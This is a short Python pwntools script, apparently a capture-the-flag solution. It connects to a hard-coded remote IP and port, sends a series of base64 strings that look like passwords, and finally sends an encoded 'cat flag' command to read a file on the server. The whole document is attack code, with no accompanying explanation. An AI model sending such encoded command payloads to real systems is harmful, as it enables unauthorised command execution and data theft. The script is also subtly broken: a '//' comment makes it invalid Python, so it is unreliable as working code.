from pwn import *

s = remote('110.10.212.138',19090)

s.recv(1024)
s.sendline('TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA')

s.recv(1024)
s.sendline('TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigA')

s.recvline()
s.sendline('TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5OigAA')

s.recv(1024)
s.sendline('AGMAYQB0ACAAZgBsAGEAZw==') // 'cat flag' base64 encode

s.recv(1024)
